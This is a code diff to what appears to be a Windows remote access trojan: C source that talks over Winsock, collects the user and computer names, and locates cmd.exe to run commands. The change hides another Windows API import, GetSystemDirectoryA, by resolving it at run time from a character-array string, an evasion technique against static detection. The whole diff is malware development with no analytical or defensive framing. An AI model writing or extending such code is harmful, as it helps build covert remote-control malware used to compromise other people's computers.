@@ -5,7 +5,6 @@
 #include <string.h>
 #include <time.h>
 
-// Ws2_32.dll definitions
 typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
 typedef int WSAAPI _connect(SOCKET s, const sockaddr *name, int namelen);
 typedef int WSAAPI _send(SOCKET s, const char *buf, int len, int flags);
@@ -18,6 +17,7 @@ typedef int WSAAPI _WSAGetLastError();
 typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
 typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
+typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
@@ -199,6 +199,14 @@ WinMain(HINSTANCE hInstance,
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
+	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+	HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
+	if ( !libraryKernel32 )
+	{
+		OutputDebugStringA("Loading libraryKernel32 failed.\n");
+		return 1;
+	}
+
 	for(;;)
 	{
 		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
@@ -224,14 +232,6 @@ WinMain(HINSTANCE hInstance,
 			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
 			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
 			len = sizeof(bufferComputer);
-
-			char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
-			HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
-			if ( !libraryKernel32 )
-			{
-				OutputDebugStringA("Loading libraryKernel32 failed.\n");
-				return 1;
-			}
 			
 			char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
 			_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(libraryKernel32, ca_GetComputerNameA);
@@ -274,7 +274,10 @@ WinMain(HINSTANCE hInstance,
 			si.cb = sizeof(si);
 
 			char cmdPath[MAX_PATH+8];
-			GetSystemDirectoryA(cmdPath, MAX_PATH);
+
+			char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
+			_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(libraryKernel32, ca_GetSystemDirectoryA);
+			f_GetSystemDirectoryA(cmdPath, MAX_PATH);
 
 			char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
 			strncat_s(cmdPath, ca_cmdexe, 8);
